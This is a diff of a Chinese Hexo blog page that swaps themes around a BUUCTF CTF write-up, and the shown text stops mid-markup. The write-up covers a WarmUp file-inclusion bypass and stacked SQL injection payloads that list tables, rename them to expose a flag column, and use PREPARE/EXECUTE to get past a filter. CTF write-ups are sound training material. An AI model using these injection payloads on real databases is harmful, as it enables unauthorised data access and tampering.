@@ -1,243 +1,520 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
 <head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="utf-8">
+    <meta name="keywords" content="BUUCTF WriteUp, 技术">
+    <meta name="description" content="一个简简单单的博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>BUUCTF WriteUp | 会飞的鱼的Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="会飞的鱼的Blog" type="application/atom+xml">
+</head>
 
 
 
-<title>
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">会飞的鱼的Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
   
-    BUUCTF WriteUp
-  
-</title>
-
-<meta name="description" content="WEB[HCTF 2018]WarmUp启动环境，打开网址是一张滑稽，没什么用，看一下源码，发现有注释。  访问source.php，直接给了源码，进行代码审计。 分两块，第一块是emmm::checkFile，里面做了一些判断。 第二块是一个include，文件包含，我们要绕过验证，也就是上面的checkFile方法。  hint.php  include触发的三个判断条件全为真时，includ">
-<meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTF WriteUp">
-<meta property="og:url" content="http://example.com/2021/01/16/BUUCTF-WriteUp/index.html">
-<meta property="og:site_name" content="会飞的鱼的Blog">
-<meta property="og:description" content="WEB[HCTF 2018]WarmUp启动环境，打开网址是一张滑稽，没什么用，看一下源码，发现有注释。  访问source.php，直接给了源码，进行代码审计。 分两块，第一块是emmm::checkFile，里面做了一些判断。 第二块是一个include，文件包含，我们要绕过验证，也就是上面的checkFile方法。  hint.php  include触发的三个判断条件全为真时，includ">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116175203912.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116180701150.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116182826228.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118190706722.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118192028103.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118193008279.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119104237475.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119105357011.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119110934155.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119110951672.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119113449940.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119113537553.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119125252021.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119133101744.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119133123261.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121320469.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121519587.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121706014.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125122755896.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125123016168.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125125046345.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125140749109.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125143053177.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126120141053.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126121719223.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126122550522.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126123103847.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126125740291.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126152717507.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126162204619.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126162254930.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201121853596.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201121815061.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201122354943.png">
-<meta property="og:image" content="c:/Users/william/AppData/Roaming/Typora/typora-user-images/image-20210201125245104.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125426233.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125516753.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125744633.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201130055891.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201132547431.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201132615994.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201140346240.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201141749208.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201143348694.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201143828718.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201151947175.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202120743721.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202124809382.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210202174257229.png">
-<meta property="article:published_time" content="2021-01-16T09:44:59.000Z">
-<meta property="article:modified_time" content="2021-02-02T09:43:01.149Z">
-<meta property="article:author" content="武英强">
-<meta property="article:tag" content="CTF WriteUP">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116175203912.png">
-
-
-  <link rel="alternative" href="/atom.xml" title="会飞的鱼的Blog" type="application/atom+xml">
-
-
-
-  <link rel="icon" href="/favicon.png">
-
-
-
-<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
-
-
-<link rel="stylesheet" href="/styles/main.css">
-
-
-
-
-
-
-
-<meta name="generator" content="Hexo 5.4.0"></head>
-<body
-  
-    class="monochrome"
-  
-  >
-  <div class="mobile-header">
-  <button class="sidebar-toggle" type="button">
-    <span class="icon-bar"></span>
-    <span class="icon-bar"></span>
-    <span class="icon-bar"></span>
-  </button>
-  <a class="title" href="/">会飞的鱼的Blog</a>
-</div>
-
-  <div class="main-container">
-    <div class="sidebar">
-  <div class="header">
-    <h1 class="title"><a href="/">会飞的鱼的Blog</a></h1>
+  <li class="hide-on-med-and-down nav-item">
     
-    <div class="info">
-      <div class="content">
-        
-          <div class="description">一个简简单单的博客</div>
-        
-        
-          <div class="author">武英强</div>
-        
-      </div>
+    <a href="/" class="waves-effect waves-light">
       
-        <div class="avatar">
-          
-            <a href="/about"><img src="https://cn.gravatar.com/avatar/35fef74d731255cd569c2c2b0b9e87e4?s=200"></a>
-          
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">会飞的鱼的Blog</div>
+        <div class="logo-desc">
+            
+            一个简简单单的博客
+            
         </div>
-      
     </div>
-  </div>
-  <div class="body">
+
     
-      
-        <ul class="nav">
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
           
-            
-              <li class="category-list-container">
-                <a href="javascript:;">分类</a>
-                
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
           
-            
-              <li class="tag-list-container">
-                <a href="javascript:;">标签</a>
-                <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-WriteUP/" rel="tag">CTF WriteUP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-WriteUp/" rel="tag">CTF WriteUp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a><span class="tag-list-count">1</span></li></ul>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
           
-            
-              <li class="archive-list-container">
-                <a href="javascript:;">归档</a>
-                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">1</span></li></ul>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
           
-        </ul>
-      
-        <ul class="nav">
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
           
-            
-              <li>
-                <a href="/" title="Homepage" external="false">Homepage</a>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
           
-            
-              <li>
-                <a href="/archives" title="By Year" external="false">By Year</a>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
           
-        </ul>
-      
-        <ul class="nav">
-          
-            
-              <li>
-                <a href="https://github.com/denjones/hexo-theme-chan" title="Chan" target="_blank" rel="noopener">Chan</a>
-              </li>
-            
-          
-            
-              <li>
-                <a href="https://github.com/denjones" title="Github" target="_blank" rel="noopener">Github</a>
-              </li>
-            
-          
-            
-              <li>
-                <a href="/atom.xml" title="RSS" external="false">RSS</a>
-              </li>
-            
-          
-        </ul>
-      
-    
-  </div>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/flyingfish20201" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
 
-    <div class="main-content">
-      
-        <div style="max-width: 1000px">
-      
-          <article id="post-BUUCTF-WriteUp" class="article article-type-post">
-  
-    <h1 class="article-header">
-      BUUCTF WriteUp
-    </h1>
-  
-  
 
-  <div class="article-info">
-    <span class="article-date">
-  2021-01-16
-</span>
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/flyingfish20201" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
 
     
 
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">BUUCTF WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
     
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WriteUP/" rel="tag">CTF WriteUP</a></li></ul>
-	</span>
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
+    #articleContent :focus {
+        outline: none;
+    }
 
-  </div>
-  <div class="article-entry">
-    <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>启动环境，打开网址是一张滑稽，没什么用，看一下源码，发现有注释。</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116175203912.png" alt="image-20210116175203912"></p>
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUP/">
+                                <span class="chip bg-color">WriteUP</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-01-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.3k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>启动环境，打开网址是一张滑稽，没什么用，看一下源码，发现有注释。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116175203912.png" alt="image-20210116175203912" title="">
+                </div>
+                <div class="image-caption">image-20210116175203912</div>
+            </figure>
+
 <p>访问source.php，直接给了源码，进行代码审计。</p>
 <p>分两块，第一块是emmm::checkFile，里面做了一些判断。</p>
 <p>第二块是一个include，文件包含，我们要绕过验证，也就是上面的checkFile方法。</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116180701150.png" alt="image-20210116180701150"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116180701150.png" alt="image-20210116180701150" title="">
+                </div>
+                <div class="image-caption">image-20210116180701150</div>
+            </figure>
+
 <p>hint.php</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116182826228.png" alt="image-20210116182826228"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210116182826228.png" alt="image-20210116182826228" title="">
+                </div>
+                <div class="image-caption">image-20210116182826228</div>
+            </figure>
+
 <p>include触发的三个判断条件全为真时，include才执行。</p>
 <p>checkFile为真</p>
 <p>第一个if，page需要设置并且为字符串</p>
@@ -270,15 +547,36 @@
 <p>到这里就没思路了，看wp，是堆叠注入，就是一次执行多条命令，之间用分号分隔</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118190706722.png" alt="image-20210118190706722"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118190706722.png" alt="image-20210118190706722" title="">
+                </div>
+                <div class="image-caption">image-20210118190706722</div>
+            </figure>
+
 <p>下来查表</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118192028103.png" alt="image-20210118192028103"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118192028103.png" alt="image-20210118192028103" title="">
+                </div>
+                <div class="image-caption">image-20210118192028103</div>
+            </figure>
+
 <p>下来查字段</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118193008279.png" alt="image-20210118193008279"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210118193008279.png" alt="image-20210118193008279" title="">
+                </div>
+                <div class="image-caption">image-20210118193008279</div>
+            </figure>
+
 <p>看到有个flag字段，应该就在这里</p>
 <p>接下来是获取flag中的内容</p>
 <p>这里有两种方法</p>
@@ -292,26 +590,75 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ; rename tables `words` to `word1` ; rename tables `1919810931114514` to `words` ;  alter table `words` change `flag` `id` varchar(100);# </span></span><br></pre></td></tr></table></figure>
 
 <p>改完名之后，直接查看就可以得到flag，因为回显的数据默认是来自word表的</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119104237475.png" alt="image-20210119104237475"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119104237475.png" alt="image-20210119104237475" title="">
+                </div>
+                <div class="image-caption">image-20210119104237475</div>
+            </figure>
+
 <p>方法二：预处理语句</p>
 <p>通过使用prepare，execute，deallocate命令来绕过验证，这里是用了concat拼接</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE hacker from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> * <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE hacker;#</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119105357011.png" alt="image-20210119105357011"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119105357011.png" alt="image-20210119105357011" title="">
+                </div>
+                <div class="image-caption">image-20210119105357011</div>
+            </figure>
+
 <h3 id="极客大挑战-2019-EasySQL1"><a href="#极客大挑战-2019-EasySQL1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p>万能密码</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119110934155.png" alt="image-20210119110934155"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119110951672.png" alt="image-20210119110951672"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119110934155.png" alt="image-20210119110934155" title="">
+                </div>
+                <div class="image-caption">image-20210119110934155</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119110951672.png" alt="image-20210119110951672" title="">
+                </div>
+                <div class="image-caption">image-20210119110951672</div>
+            </figure>
+
 <h3 id="极客大挑战-2019-Havefun1"><a href="#极客大挑战-2019-Havefun1" class="headerlink" title="[极客大挑战 2019]Havefun1"></a>[极客大挑战 2019]Havefun1</h3><p>看源码，有一段注释</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119113449940.png" alt="image-20210119113449940"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
